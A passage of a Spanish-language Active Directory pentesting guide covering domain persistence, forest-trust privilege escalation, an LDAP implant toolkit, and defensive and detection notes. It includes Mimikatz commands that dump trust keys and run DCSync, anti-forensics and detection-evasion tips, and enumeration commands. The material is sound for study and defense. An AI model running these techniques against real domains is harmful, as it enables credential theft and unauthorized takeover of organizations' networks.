Podrías **dar** algunos **permisos especiales** a un **usuario** sobre objetos de dominio específicos que le permitan **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Los **security descriptors** se usan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si puedes **hacer** solo un **pequeño cambio** en el **security descriptor** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesidad de ser miembro de un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto claro** las **credenciales** usadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en el AD y lo usa para **push attributes** (SIDHistory, SPNs...) sobre objetos especificados **sin** dejar ningún **log** relativo a las **modifications**. **Necesitas** privilegios de DA y estar dentro del **root domain**.\
Ten en cuenta que si usas datos incorrectos, aparecerán logs bastante feos.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Antes hemos discutido cómo escalar privilegios si tienes **suficientes permisos para leer contraseñas LAPS**. Sin embargo, estas contraseñas también pueden usarse para **mantener persistencia**.\
Consulta:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera el **Forest** como el límite de seguridad. Esto implica que **comprometer un único dominio podría potencialmente llevar a comprometer todo el Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **dominio** acceder a recursos en otro **dominio**. Básicamente crea un vínculo entre los sistemas de autenticación de ambos dominios, permitiendo que las verificaciones de autenticación fluyan sin problemas. Cuando los dominios establecen un trust, intercambian y conservan **keys** específicas dentro de sus **Domain Controllers (DCs)**, que son cruciales para la integridad del trust.

En un escenario típico, si un usuario desea acceder a un servicio en un **trusted domain**, primero debe solicitar un ticket especial conocido como **inter-realm TGT** desde el DC de su propio dominio. Este TGT se cifra con una **key** compartida que ambos dominios han acordado. Luego el usuario presenta este TGT al **DC del trusted domain** para obtener un service ticket (**TGS**). Tras validar correctamente el inter-realm TGT por parte del DC del trusted domain, este emite un TGS, otorgando al usuario acceso al servicio.

**Steps**:

1. Un **client computer** en **Domain 1** inicia el proceso usando su **NTLM hash** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. DC1 emite un nuevo TGT si el cliente se autentica correctamente.
3. El cliente entonces solicita un **inter-realm TGT** a DC1, que es necesario para acceder a recursos en **Domain 2**.
4. El inter-realm TGT se cifra con una **trust key** compartida entre DC1 y DC2 como parte del domain trust bidireccional.
5. El cliente lleva el inter-realm TGT al **Domain Controller (DC2) de Domain 2**.
6. DC2 verifica el inter-realm TGT usando su trust key compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el server en Domain 2 al que el cliente quiere acceder.
7. Finalmente, el cliente presenta este TGS al server, que está cifrado con el hash de la cuenta del server, para obtener acceso al servicio en Domain 2.

### Different trusts

Es importante notar que **un trust puede ser de 1 vía o de 2 vías**. En las opciones de 2 vías, ambos dominios confiarán el uno en el otro, pero en la relación de trust de **1 vía** uno de los dominios será el **trusted** y el otro el **trusting**. En el último caso, **solo podrás acceder a recursos dentro del trusting domain desde el trusted one**.

Si Domain A trusts Domain B, A es el trusting domain y B es el trusted one. Además, en **Domain A**, esto sería un **Outbound trust**; y en **Domain B**, esto sería un **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Esta es una configuración común dentro del mismo forest, donde un child domain tiene automáticamente un two-way transitive trust con su parent domain. Básicamente, esto significa que las solicitudes de autenticación pueden fluir sin problemas entre el parent y el child.
- **Cross-link Trusts**: Llamados "shortcut trusts", se establecen entre child domains para acelerar los procesos de referral. En forests complejos, las referral de autenticación normalmente tienen que viajar hasta el forest root y luego bajar hasta el target domain. Al crear cross-links, el recorrido se acorta, lo que es especialmente beneficioso en entornos geográficamente dispersos.
- **External Trusts**: Se configuran entre distintos dominios no relacionados y por naturaleza no son transitive. Según la [documentación de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), los external trusts son útiles para acceder a recursos en un dominio fuera del forest actual que no está conectado mediante un forest trust. La seguridad se refuerza mediante SID filtering con external trusts.
- **Tree-root Trusts**: Estos trusts se establecen automáticamente entre el forest root domain y un tree root recién añadido. Aunque no se encuentran comúnmente, los tree-root trusts son importantes para añadir nuevos domain trees a un forest, permitiéndoles mantener un nombre de dominio único y asegurando una transitivity bidireccional. Más información puede encontrarse en la [guía de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust es un two-way transitive trust entre dos forest root domains, aplicando también SID filtering para mejorar las medidas de seguridad.
- **MIT Trusts**: Estos trusts se establecen con dominios Kerberos no-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120). Los MIT trusts son algo más especializados y están orientados a entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema Windows.

#### Other differences in **trusting relationships**

- Una trust relationship también puede ser **transitive** (A trust B, B trust C, entonces A trust C) o **non-transitive**.
- Una trust relationship puede configurarse como **bidirectional trust** (ambos confían el uno en el otro) o como **one-way trust** (solo uno de ellos confía en el otro).

### Attack Path

1. **Enumerar** las trusting relationships
2. Comprobar si algún **security principal** (user/group/computer) tiene **acceso** a recursos del **otro domain**, quizá por entradas ACE o por estar en grupos del otro domain. Busca **relaciones entre dominios** (la trust se creó probablemente para esto).
1. kerberoast en este caso podría ser otra opción.
3. **Comprometer** las **accounts** que pueden **pivotar** entre dominios.

Attackers con acceso a recursos en otro dominio mediante tres mecanismos principales:

- **Local Group Membership**: Los principals podrían ser añadidos a grupos locales en máquinas, como el grupo “Administrators” en un server, otorgándoles un control significativo sobre esa máquina.
- **Foreign Domain Group Membership**: Los principals también pueden ser miembros de grupos dentro del foreign domain. Sin embargo, la eficacia de este método depende de la naturaleza del trust y del alcance del grupo.
- **Access Control Lists (ACLs)**: Los principals podrían especificarse en una **ACL**, particularmente como entidades en **ACEs** dentro de una **DACL**, proporcionándoles acceso a recursos específicos. Para quienes quieran profundizar en la mecánica de ACLs, DACLs y ACEs, el whitepaper titulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” es un recurso invaluable.

### Find external users/groups with permissions

Puedes comprobar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals en el domain. Estos serán user/group de **un dominio/forest externo**.

Podrías comprobar esto en **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalación de privilegios de Child-to-Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Otras formas de enumerar trusts de dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Hay **2 claves de confianza**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes usar la usada por el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escala como Enterprise admin al dominio child/parent abusando de la trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender cómo se puede explotar el Configuration Naming Context (NC) es crucial. El Configuration NC sirve como un repositorio central para datos de configuración en todos los entornos de Active Directory (AD) dentro de un forest. Estos datos se replican a cada Domain Controller (DC) dentro del forest, y los DCs writeable mantienen una copia writable del Configuration NC. Para explotarlo, se debe tener **privilegios SYSTEM en un DC**, preferiblemente un child DC.

**Link GPO to root DC site**

El contenedor Sites del Configuration NC incluye información sobre los sites de todos los equipos unidos al dominio dentro del forest de AD. Operando con privilegios SYSTEM en cualquier DC, los attackers pueden vincular GPOs a los root DC sites. Esta acción puede comprometer potencialmente el root domain manipulando las policies aplicadas a estos sites.

Para información más profunda, se puede explorar investigación sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vector de attack consiste en apuntar a gMSAs privilegiadas dentro del dominio. La KDS Root key, esencial para calcular las passwords de las gMSAs, se almacena dentro del Configuration NC. Con privilegios SYSTEM en cualquier DC, es posible acceder a la KDS Root key y calcular las passwords de cualquier gMSA en todo el forest.

El análisis detallado y la guía paso a paso se pueden encontrar en:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque delegado complementario de MSA (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Investigación externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método requiere paciencia, esperando la creación de nuevos objetos privilegiados de AD. Con privilegios SYSTEM, un attacker puede modificar el AD Schema para conceder a cualquier usuario control total sobre todas las classes. Esto podría llevar a acceso no autorizado y control sobre nuevos objetos de AD creados.

Hay más información en [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerability ADCS ESC5 apunta al control sobre objetos de Public Key Infrastructure (PKI) para crear una certificate template que permita autenticación como cualquier usuario dentro del forest. Como los objetos PKI residen en el Configuration NC, comprometer un writable child DC permite ejecutar attacks ESC5.

Se pueden leer más detalles en [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). En escenarios sin ADCS, el attacker tiene la capacidad de configurar los componentes necesarios, como se explica en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
En este escenario **your domain is trusted** por uno externo, dándote **undetermined permissions** sobre él. Tendrás que encontrar **qué principals de tu dominio tienen qué acceso sobre el dominio externo** y luego intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
En este escenario **tu dominio** está **confiando** algunos **privilegios** a un principal de **diferentes dominios**.

Sin embargo, cuando un **domain is trusted** por el trusting domain, el trusted domain **crea un usuario** con un **nombre predecible** que usa como **password the trusted password**. Lo que significa que es posible **acceder a un usuario del trusting domain para entrar en el trusted one** y enumerarlo e intentar escalar más privilegios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el trusted domain es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** de la domain trust (lo cual no es muy común).

Otra forma de comprometer el trusted domain es esperar en una máquina donde un **usuario del trusted domain puede acceder** para iniciar sesión vía **RDP**. Entonces, el atacante podría inyectar código en el proceso de la sesión RDP y **acceder al origin domain de la víctima** desde ahí.\
Además, si la **víctima montó su disco duro**, desde el proceso de la sesión **RDP** el atacante podría almacenar **backdoors** en la **startup folder of the hard drive**. Esta técnica se llama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- El riesgo de ataques que aprovechan el atributo SID history a través de forest trusts se mitiga mediante SID Filtering, que está activado por defecto en todos los inter-forest trusts. Esto se basa en la suposición de que los intra-forest trusts son seguros, considerando el forest, en lugar del domain, como el límite de seguridad, según la postura de Microsoft.
- Sin embargo, hay un inconveniente: SID filtering podría interrumpir aplicaciones y el acceso de usuarios, lo que a veces lleva a su desactivación.

### **Selective Authentication:**

- Para inter-forest trusts, usar Selective Authentication garantiza que los usuarios de los dos forests no se autentiquen automáticamente. En su lugar, se requieren permisos explícitos para que los usuarios accedan a dominios y servidores dentro del trusting domain o forest.
- Es importante señalar que estas medidas no protegen contra la explotación del writable Configuration Naming Context (NC) ni contra ataques a la trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa primitivas LDAP al estilo bloodyAD como archivos x64 Beacon Object Files que se ejecutan completamente dentro de un on-host implant (por ejemplo, Adaptix C2). Los operadores compilan el paquete con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, cargan `ldap.axs` y luego llaman `ldap <subcommand>` desde el beacon. Todo el tráfico usa el contexto de seguridad de inicio de sesión actual sobre LDAP (389) con signing/sealing o LDAPS (636) con auto certificate trust, así que no se requieren socks proxies ni artefactos en disco.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, y `get-groupmembers` resuelven nombres cortos/rutas OU en DN completos y vuelcan los objetos correspondientes.
- `get-object`, `get-attribute`, y `get-domaininfo` extraen atributos arbitrarios (incluidos security descriptors) además de los metadatos del forest/domain desde `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, y `get-rbcd` exponen directamente desde LDAP candidatos para roasting, configuraciones de delegation y descriptores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` y `get-writable --detailed` analizan la DACL para listar trustees, derechos (GenericAll/WriteDACL/WriteOwner/attribute writes) e inheritance, proporcionando objetivos inmediatos para ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivas de escritura LDAP para escalada y persistencia

- Las BOFs de creación de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador preparar nuevos principals o cuentas de máquina donde existan permisos de OU. `add-groupmember`, `set-password`, `add-attribute` y `set-attribute` secuestran directamente los objetivos una vez que se encuentran permisos de write-property.
- Comandos centrados en ACL como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` y `add-dcsync` traducen WriteDACL/WriteOwner sobre cualquier objeto AD en reseteos de contraseña, control de pertenencia a grupos o privilegios de replicación DCSync sin dejar artefactos de PowerShell/ADSI. Los equivalentes `remove-*` limpian los ACE inyectados.

### Delegation, roasting y abuso de Kerberos

- `add-spn`/`set-spn` vuelven inmediatamente roastable a un usuario comprometido con Kerberoast; `add-asreproastable` (UAC toggle) lo marca para AS-REP roasting sin tocar la contraseña.
- Las macros de Delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescriben `msDS-AllowedToDelegateTo`, banderas UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, habilitando rutas de ataque constrained/unconstrained/RBCD y eliminando la necesidad de PowerShell remoto o RSAT.

### Inyección de sidHistory, reubicación de OU y modelado de la superficie de ataque

- `add-sidhistory` inyecta SIDs privilegiados en el SID history de un principal controlado (ver [SID-History Injection](sid-history-injection.md)), proporcionando herencia de acceso sigilosa completamente sobre LDAP/LDAPS.
- `move-object` cambia el DN/OU de computadoras o usuarios, permitiendo a un atacante arrastrar activos a OUs donde ya existen derechos delegados antes de abusar de `set-password`, `add-groupmember` o `add-spn`.
- Los comandos de eliminación con alcance estricto (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten revertir rápidamente los cambios después de que el operador obtenga credenciales o persistencia, minimizando la telemetría.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algunas defensas generales

[**Aprende más sobre cómo proteger credenciales aquí.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para la protección de credenciales**

- **Restricciones para Domain Admins**: Se recomienda que a los Domain Admins solo se les permita iniciar sesión en Domain Controllers, evitando su uso en otros hosts.
- **Privilegios de cuentas de servicio**: Los servicios no deben ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Limitación temporal de privilegios**: Para tareas que requieran privilegios de DA, su duración debe limitarse. Esto se puede lograr con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigación de LDAP relay**: Audita los Event IDs 2889/3074/3075 y luego aplica LDAP signing y LDAPS channel binding en DCs/clients para bloquear intentos de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a nivel de protocolo de actividad de Impacket

Si quieres detectar common AD tradecraft, **no dependas solo de artefactos controlados por el operador** como binarios renombrados, nombres de servicio, archivos batch temporales o rutas de salida. Establece una línea base de cómo los clientes Windows legítimos construyen tráfico [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC y WMI, y luego busca **particularidades de implementación** que permanecen incluso después de que el operador edite `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.

- **Candidatos independientes de alta confianza** (después de validarlos contra tu propia línea base):
- DCE/RPC autenticado usando `auth_context_id = 79231 + ctx_id`
- Relleno de autenticación DCE/RPC con `0xff`
- Bindings LDAP Kerberos que colocan un `AP-REQ` Kerberos en bruto directamente en el `mechToken` de SPNEGO
- Solicitudes SMB2/3 negotiate con valores `ClientGuid` que parecen ASCII
- WMI `IWbemLevel1Login::NTLMLogin` usando el namespace no estándar `//./root/cimv2`
- Valores de nonce de Kerberos hardcoded
- **Mejor como features de correlación/scoring**:
- Listas de etypes de Kerberos escasas o duplicadas, `PA-DATA` inusual/ausente, u ordenación de etypes en TGS-REQ que difiere de Windows nativo
- Mensajes NTLM Type 1 sin información de versión o mensajes Type 3 con nombres de host nulos
- NTLMSSP en bruto transportado en DCE/RPC en lugar de SPNEGO, trailers de verificación DCE/RPC ausentes o desajustes de OID SPNEGO/Kerberos
- Varias de estas señales del mismo host/user/session/time window son mucho más sólidas que cualquier campo débil individual
- **Usar como enriquecimiento, no como alertas autónomas**:
- Nombres de archivo por defecto, rutas de salida, nombres de servicio aleatorios, nombres batch temporales, nombres de cuenta de equipo por defecto y cadenas HTTP/WebDAV/RDP/MSSQL específicas de la herramienta
- Son fáciles de cambiar para los operadores y se usan mejor para explicar por qué un cluster cross-protocol es sospechoso
- **Notas operativas**:
- Algunas de estas señales requieren tráfico descifrado, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilidad del lado del servicio
- Valida contra clientes Samba/Linux, appliances y software legacy antes de promoverlas a alertas
- Promueve las detecciones desde enriquecimiento -> hunting -> alerting a medida que construyes confianza en la línea base

### **Implementación de técnicas de deception**

- La implementación de deception consiste en crear trampas, como usuarios o computadoras señuelo, con características como contraseñas que no expiran o que están marcadas como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o añadirlos a grupos de alto privilegio.
- Un ejemplo práctico implica usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Más sobre la implementación de técnicas de deception se puede encontrar en [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificación de deception**

- **Para objetos de usuario**: Los indicadores sospechosos incluyen ObjectSID atípico, logons poco frecuentes, fechas de creación y conteos bajos de bad password.
- **Indicadores generales**: Comparar atributos de posibles objetos señuelo con los de objetos reales puede revelar inconsistencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar este tipo de deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **Enumeración de usuarios**: Evitar la enumeración de sesiones en Domain Controllers para prevenir la detección de ATA.
- **Suplantación de tickets**: Utilizar claves **aes** para la creación de tickets ayuda a evadir la detección al no degradar a NTLM.
- **Ataques DCSync**: Se recomienda ejecutarlos desde un servidor que no sea Domain Controller para evitar la detección de ATA, ya que ejecutarlos directamente desde un Domain Controller activará alertas.

## Referencias

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
